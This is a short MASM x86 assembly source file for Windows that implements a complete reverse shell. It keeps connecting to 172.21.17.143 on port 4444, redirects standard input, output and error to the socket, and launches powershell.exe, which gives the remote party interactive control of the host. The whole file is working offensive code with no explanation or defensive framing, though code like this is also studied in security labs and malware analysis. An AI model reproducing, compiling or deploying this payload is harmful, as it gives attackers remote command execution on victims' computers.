.686
.model flat, stdcall
OPTION CaseMap:None

include \masm\include\windows.inc
include \masm\include\kernel32.inc
include \masm\include\ws2_32.inc

.data
	wsadata WSADATA <>
	sockfd dd ?
	addrInfo sockaddr_in <>
	ip db "172.21.17.143",0
	port dw 4444
	process db "powershell.exe",0
	startInfo STARTUPINFOA <>
	procInfo PROCESS_INFORMATION <>

.code

main proc
	invoke WSAStartup, 0202h, addr wsadata

	invoke WSASocket, AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0
	cmp eax, 0
	je Exit
	mov sockfd, eax

	mov addrInfo.sin_family, AF_INET
	xor eax, eax
	invoke htons, port
	mov addrInfo.sin_port, ax
	invoke inet_addr, addr ip
	mov addrInfo.sin_addr, eax
	
	call Connect

	mov startInfo.cb, sizeof STARTUPINFOA
	mov ebx, sockfd
	mov startInfo.hStdInput, ebx
	mov startInfo.hStdOutput, ebx
	mov startInfo.hStdError, ebx

	mov ebx, STARTF_USESTDHANDLES
	mov startInfo.dwFlags, ebx

	invoke CreateProcessA, 0, addr process, 0, 0, 1, 0, 0, 0, addr startInfo, addr procInfo
	invoke WaitForSingleObject, procInfo.hThread, INFINITE
	jmp Exit

Connect:
	invoke WSAConnect, sockfd, addr addrInfo, sizeof addrInfo, 0, 0, 0, 0
	cmp eax, 0
	jne Connect
	ret

Exit:
	invoke closesocket, sockfd
	invoke WSACleanup
	invoke ExitProcess, 0
main endp
end
